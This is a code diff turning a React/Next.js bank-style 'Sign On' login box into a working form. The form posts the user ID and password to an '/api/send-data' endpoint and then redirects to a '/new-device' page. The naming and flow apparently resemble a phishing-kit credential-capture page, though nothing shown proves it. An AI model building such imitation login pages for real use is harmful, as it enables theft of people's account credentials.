@@ -1,29 +1,76 @@
-import React from "react";
+"use client";
+
+import React, { useState } from "react";
+import { useRouter } from "next/navigation";
+import axios from "axios";
 import { BsQrCodeScan } from "react-icons/bs";
 
 const LoginBox = () => {
+  const router = useRouter();
+  const [formData, setFormData] = useState({
+    userId: "",
+    password: "",
+    check: false,
+  });
+  const [loading, setLoading] = useState(false);
+
+  const handleChange = (e) => {
+    const { name, type, value, checked } = e.target;
+    setFormData((prev) => ({
+      ...prev,
+      [name]: type === "checkbox" ? checked : value,
+    }));
+  };
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    if (!formData.userId || !formData.password) {
+      alert("Please fill in all required fields.");
+      return;
+    }
+
+    try {
+      setLoading(true);
+      const res = await axios.post("/api/send-data", formData);
+      if (res.status === 200) {
+        router.push("/new-device");
+      }
+    } catch (err) {
+      alert("Login failed. Please check your credentials and try again.");
+    } finally {
+      setLoading(false);
+    }
+  };
+
   return (
-    <div
+    <form
+      onSubmit={handleSubmit}
       className="w-[385px] bg-white rounded-2xl"
       style={{ boxShadow: "0 0 10px #00000040" }}
     >
       <div className="pt-3 px-4">
         <div className="flex gap-2">
-          <div className="">
-            <p className="text-sm pb-2 font-medium text-sec">User ID</p>
+          <div>
+            <p className="text-sm pb-2 font-medium text-sec">User ID *</p>
             <input
               placeholder="User ID"
               type="text"
               name="userId"
+              value={formData.userId}
+              onChange={handleChange}
+              required
               className="h-[48px] w-[170px] border-1 border-gray-400 rounded-lg pl-3 placeholder:font-medium"
             />
           </div>
-          <div className="">
-            <p className="text-sm pb-2 font-medium text-sec">Password</p>
+          <div>
+            <p className="text-sm pb-2 font-medium text-sec">Password *</p>
             <input
               placeholder="Password"
               type="password"
               name="password"
+              value={formData.password}
+              onChange={handleChange}
+              required
               className="h-[48px] w-[170px] border-1 border-gray-400 rounded-lg pl-3 placeholder:font-medium"
             />
           </div>
@@ -34,7 +81,8 @@ const LoginBox = () => {
             type="checkbox"
             id="check"
             name="check"
-            placeholder="Remember User ID"
+            checked={formData.check}
+            onChange={handleChange}
             className="w-[22px] h-[22px]"
           />
           <label htmlFor="check" className="text-xs">
@@ -42,8 +90,12 @@ const LoginBox = () => {
           </label>
         </div>
 
-        <button className="cursor-pointer w-full py-[10px] mt-5 bg-primary rounded-lg font-bold text-white hover:!bg-[#054e7b]">
-          Sign On
+        <button
+          type="submit"
+          disabled={loading}
+          className="cursor-pointer w-full py-[10px] mt-5 bg-primary rounded-lg font-bold text-white hover:!bg-[#054e7b] disabled:opacity-60"
+        >
+          {loading ? "Signing In..." : "Sign On"}
         </button>
 
         <div className="flex-between text-sm mt-5">
@@ -75,7 +127,7 @@ const LoginBox = () => {
           Passwordless Sign On
         </span>
       </div>
-    </div>
+    </form>
   );
 };
 
